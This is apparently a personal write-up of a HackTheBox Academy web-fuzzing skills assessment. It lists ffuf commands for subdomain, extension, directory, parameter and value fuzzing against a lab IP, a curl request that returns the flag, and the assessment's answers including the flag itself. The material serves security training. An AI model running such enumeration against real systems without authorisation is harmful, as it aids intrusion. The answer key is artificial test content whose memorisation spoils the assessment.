---
platform: hackthebox
difficulty: Easy
status: Completed
date: 2026-10-14
tags:
  - difficulty/easy
---
# HTB: Skills Assessment - Web Fuzzing

| Target:               |
| --------------------- |
| `154.57.164.83:41216` |



---

## 01 - Scope
### Assignment:
You are given an online academy's IP address but have no further information about their website. As the first step of conducting a Penetration Test, you are expected to locate all pages and domains linked to their IP to enumerate the IP and domains properly.

Finally, you should do some fuzzing on pages you identify to see if any of them has any parameters that can be interacted with. If you do find active parameters, see if you can retrieve any data from them.
### Objectives:
- **Primary Goals:**
  - [x] Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)
`archive,test,faculty`
  - [x] Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?
`phps,php,php7`
  - [x] One of the pages you will identify should say 'You don't have access!'. What is the full page URL?
`http://faculty.academy.htb:PORT/courses/linux-security.php7`
  - [x] In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?
`user,username`
  - [x] Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?
`HTB{w3b_fuzz1n6_m4573r}`

---

## 02 - Procedure
1. I first did a `Vhost scan` with `ffuf` in order to find the sub-domains:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://154.57.164.83:41216 -H "Host: FUZZ.academy.htb" -fs 985
```
And found following:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014162604.png)

2. Then I did a `index file scan` in order to figure out the accepted `extensions`, which I assume is referring to `file extensions`:
```bash
ffuf -u http://154.57.164.83:41216/indexEXT -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:EXT -ic
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014163417.png)
Since `.phps,.php` wasn't the correct answer I also scanned the subdomains...
```bash
ffuf -u http://154.57.164.83:41216/indexEXT -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:EXT -ic -H "Host: faculty.academy.htb"
```
...and additionally found `.php7`

3. I then scanned the subdomains for any subsites with a recursive `ffuf directory/subsites scan` the previously found file-endings:
```bash
ffuf -u http://faculty.academy.htb:41216/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -ic -recursion -e .phps,.php,.php7 -fs 287
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014170430.png)

So I `curled` the listed subsites and eventually found the `You don't have access!`:
```bash
curl -i http://faculty.academy.htb:41216/courses/linux-security.php7
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014170305.png)

4. In order to find the parameter run a `Parameter-Fuzz` with the "burp-parameter list"to see if I can find:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://faculty.academy.htb:35246/courses/linux-security.php7 -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014171908.png)

5. Next up I did the same thing but reversed, so that `user&username` are the fixed parameter, but this time their values get fuzzed. After trying some user/names list, I eventually found a user:
```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u http://faculty.academy.htb:35246/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014173636.png)

I then `curled` it and retrieved the flag:
```bash
curl -X POST http://faculty.academy.htb:35246/courses/linux-security.php7 -H "Content-Type: application/x-www-form-urlencoded" -d "username=harry"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261014173851.png)

## 10 - Lesson Learned
Fuzzing can be pretty straight forward and mostly relies on good fuzzing-lists.